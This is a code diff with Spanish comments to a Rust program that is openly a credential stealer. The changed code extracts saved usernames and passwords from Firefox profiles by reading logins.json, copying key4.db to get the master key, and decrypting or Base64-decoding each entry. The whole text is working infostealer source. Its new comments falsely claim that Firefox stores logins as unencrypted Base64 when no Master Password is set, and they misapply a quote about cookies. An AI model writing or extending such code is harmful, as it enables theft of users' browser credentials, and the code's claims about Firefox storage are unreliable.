@@ -40,36 +40,40 @@ pub fn steal_firefox() -> StealerResult<Vec<Credential>> {
 /// Extrae credenciales de un perfil específico de Firefox
 fn extract_firefox_profile(profile_path: &PathBuf) -> StealerResult<Vec<Credential>> {
     // Firefox almacena:
-    // - logins.json: credenciales encriptadas (JSON)
-    // - key4.db: master key encriptada (SQLite)
+    // - logins.json: credenciales (pueden estar encriptadas o NO)
+    // - key4.db: master key (solo si user configuró Master Password)
     
     let logins_json = profile_path.join("logins.json");
-    let key4_db = profile_path.join("key4.db");
     
-    if !file_exists(&logins_json) || !file_exists(&key4_db) {
-        return Err(StealerError::DatabaseError("Firefox data files not found".into()));
+    if !file_exists(&logins_json) {
+        return Err(StealerError::DatabaseError("Firefox logins.json not found".into()));
     }
 
     // Leer logins.json
     let logins_content = std::fs::read_to_string(&logins_json)
         .map_err(|e| StealerError::IoError(e.to_string()))?;
     
-    // Copiar key4.db a temp (puede estar locked)
-    let temp_key4 = copy_db_to_temp(&key4_db)?;
+    // IMPORTANTE: Firefox solo encripta credenciales si el usuario configuró Master Password
+    // En la mayoría de casos, las credenciales NO están encriptadas (solo obfuscadas con Base64)
+    // Referencia: https://netlas.io/blog/hannibal_stealer_part_1/
+    // "Firefox does not encrypt cookies at rest (unless a master password is set by the user, which is uncommon)"
     
-    // Extraer la master key del key4.db
-    // NOTA IMPORTANTE: Firefox usa una master password opcional
-    // Si el usuario tiene master password, necesitaríamos ese password
-    // Por ahora asumimos que NO hay master password configurada
-    let master_key = match extract_firefox_master_key(&temp_key4) {
-        Ok(key) => Some(key),
-        Err(_) => None,  // Sin master password o error
+    // Intentar extraer master key (solo si existe key4.db y el user tiene Master Password)
+    let key4_db = profile_path.join("key4.db");
+    let master_key = if file_exists(&key4_db) {
+        let temp_key4 = match copy_db_to_temp(&key4_db) {
+            Ok(p) => p,
+            Err(_) => return parse_firefox_logins(&logins_content, None),  // key4.db locked, parsear sin key
+        };
+        
+        let key = extract_firefox_master_key(&temp_key4).ok();
+        let _ = std::fs::remove_file(&temp_key4);
+        key
+    } else {
+        None  // No key4.db = definitivamente no encrypted
     };
     
-    // Limpiar temp
-    let _ = std::fs::remove_file(&temp_key4);
-    
-    // Parsear logins.json y desencriptar
+    // Parsear logins.json (con o sin master key)
     parse_firefox_logins(&logins_content, master_key.as_deref())
 }
 
@@ -219,8 +223,10 @@ fn decrypt_3des_cbc(ciphertext: &[u8], key: &[u8], iv: &[u8]) -> StealerResult<V
 fn parse_firefox_logins(json_content: &str, master_key: Option<&[u8]>) -> StealerResult<Vec<Credential>> {
     let mut credentials = Vec::new();
     
-    // Buscar todas las entradas de login (parsing simple sin dependencia JSON)
-    // Estructura: "logins": [{ "hostname": "...", "encryptedUsername": "...", "encryptedPassword": "..." }, ...]
+    // Firefox tiene 2 formatos dependiendo de si hay Master Password:
+    // - CON Master Password: "encryptedUsername", "encryptedPassword" (Base64 de datos encriptados con 3DES)
+    // - SIN Master Password: "username", "password" (Base64 de datos en TEXTO PLANO)
+    // Referencia: Dexter malware, Hannibal Stealer analysis
     
     if let Some(logins_start) = json_content.find("\"logins\":[") {
         let logins_section = &json_content[logins_start..];
@@ -233,23 +239,47 @@ fn parse_firefox_logins(json_content: &str, master_key: Option<&[u8]>) -> Steale
             if let Some(entry_end) = logins_section[pos..].find("}") {
                 let entry = &logins_section[pos..pos + entry_end + 1];
                 
-                // Extraer campos
+                // Extraer hostname
                 let hostname = extract_json_field(entry, "hostname");
+                
+                // Firefox puede tener AMBOS formatos en el mismo archivo
+                // Intentar campos encriptados primero
                 let enc_username = extract_json_field(entry, "encryptedUsername");
                 let enc_password = extract_json_field(entry, "encryptedPassword");
                 
-                if let (Some(url), Some(enc_user), Some(enc_pass)) = (hostname, enc_username, enc_password) {
-                    // Desencriptar
-                    let username = if let Some(key) = master_key {
-                        decrypt_firefox_field(&enc_user, key).unwrap_or_else(|_| "[decrypt failed]".to_string())
+                // Si no hay campos encriptados, intentar campos en texto plano
+                let plain_username = extract_json_field(entry, "username");
+                let plain_password = extract_json_field(entry, "password");
+                
+                if let Some(url) = hostname {
+                    let (username, password) = if enc_username.is_some() || enc_password.is_some() {
+                        // Credenciales ENCRIPTADAS (Master Password configurada)
+                        if let Some(key) = master_key {
+                            let user = enc_username
+                                .and_then(|enc| decrypt_firefox_field(&enc, key).ok())
+                                .unwrap_or_else(|| "[decrypt failed]".to_string());
+                            let pass = enc_password
+                                .and_then(|enc| decrypt_firefox_field(&enc, key).ok())
+                                .unwrap_or_else(|| "[decrypt failed]".to_string());
+                            (user, pass)
+                        } else {
+                            // Necesita master key pero no la tenemos
+                            ("[encrypted - no master key]".to_string(), "[encrypted - no master key]".to_string())
+                        }
+                    } else if plain_username.is_some() || plain_password.is_some() {
+                        // Credenciales en TEXTO PLANO (Base64 pero NO encriptadas)
+                        let user = plain_username
+                            .and_then(|b64| base64_decode(&b64).ok())
+                            .and_then(|bytes| String::from_utf8(bytes).ok())
+                            .unwrap_or_else(|| "[decode failed]".to_string());
+                        let pass = plain_password
+                            .and_then(|b64| base64_decode(&b64).ok())
+                            .and_then(|bytes| String::from_utf8(bytes).ok())
+                            .unwrap_or_else(|| "[decode failed]".to_string());
+                        (user, pass)
                     } else {
-                        "[no master key]".to_string()
-                    };
-                    
-                    let password = if let Some(key) = master_key {
-                        decrypt_firefox_field(&enc_pass, key).unwrap_or_else(|_| "[decrypt failed]".to_string())
-                    } else {
-                        "[no master key]".to_string()
+                        // No hay datos de credenciales
+                        continue;
                     };
                     
                     credentials.push(Credential {
